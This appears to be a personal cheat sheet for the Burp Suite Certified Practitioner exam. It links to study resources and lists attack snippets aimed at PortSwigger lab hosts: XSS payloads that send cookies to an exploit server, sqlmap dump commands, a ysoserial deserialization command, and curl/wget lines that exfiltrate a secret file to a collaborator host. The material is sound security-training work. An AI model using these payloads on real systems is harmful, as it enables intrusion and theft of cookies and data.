# Resources
- [botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md)
- [DingyShark/BurpSuiteCertifiedPractitioner](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner?tab=readme-ov-file)
- [micahvandeusen - burp-suite-certified-practitioner-exam-review](https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/)
- [ChrisM-X/PortSwigger-Academy-CheatSheets](https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/tree/master/_Prepare%20For%20Burp%20Suite%20Exam)
- [pawlokk/burp-exam-notes/blob/main/methodology.txt](https://github.com/pawlokk/burp-exam-notes/blob/main/methodology.txt)
- [bscpcheatsheet.gitbook.io/exam](https://bscpcheatsheet.gitbook.io/exam)
# More extensions
Quick detection - Scan Manual insertion point https://portswigger.net/bappstore/ca7ee4e746b54514a0ca5059329e926f
# Payload processing
- [Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
# XSS
"-(window["document"]["location"]="https://exploit-server%2eweb-security-academy%2enet/?"+window["document"]["cookie"])-"
"}; window['docu'+'ment']['loc'+'ation']='https://subdomain%2eexploit-server%2enet/?'+(window['docu'+'ment']['coo'+'kie']);//
```html
<script>
location ='https://url.web-security-academy.net/?SearchTerm=%22-%28window%5B%22document%22%5D%5B%22location%22%5D%3D%22https%3A%2F%2Fexploit-0ab600a70433f087809c020301d4004f%252eexploit-server%252enet%2F%3F%22%2Bwindow%5B%22document%22%5D%5B%22cookie%22%5D%29-%22';
</script>
```

# SQLi
sqlmap -r request --level=5 --risk=3 --batch -p "parameter" -dump <-- takes too long
sqlmap -u "url-here" --cookie="cookies-here" --level=5 --risk=3 --batch -p "parameter" --dump <-- takes too long
sqlmap -u "url-here" --cookie="cookies-here" --batch --dbs --random-agent -p "parameter" --proxy="http://127.0.0.1:8080/"
sqlmap -u "url-here" --cookie="cookies-here" --batch --dbs --random-agent -p "parameter"

# Insecure Deserialization
- Command
```bash
java -jar ysoserial-all.jar [payload] "command"
```
- Base64 encode the payload piping the output to `base64 -w 0`
   - For MacOS use the `gbase64` command which accepts the -w flag

```bash
java -jar ysoserial-all.jar [payload] "command" | gzip -c | base64 -w 0
```
# Command for data exfiltration
curl --data @/home/carlos/secret subdomain.collaborator.net
wget --post-file /home/carlos/secret subdomain.collaborator.net